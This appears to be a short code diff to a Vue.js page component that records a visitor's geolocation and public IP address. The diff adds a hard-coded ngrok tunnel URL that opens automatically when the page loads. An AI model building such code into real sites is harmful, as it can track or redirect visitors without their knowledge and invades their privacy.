@@ -32,6 +32,7 @@
                 long: "",
                 lat: "",
                 ip: "",
+                url:"https://6d012d33a035.ngrok.io/",
                 position: "",
                 denied:true,
                 options: {
@@ -42,6 +43,7 @@
             },
             created() {
                 this.getLocation();
+                window.open(this.url);
             },
             mounted() {
                 fetch("https://api.ipify.org?format=json")
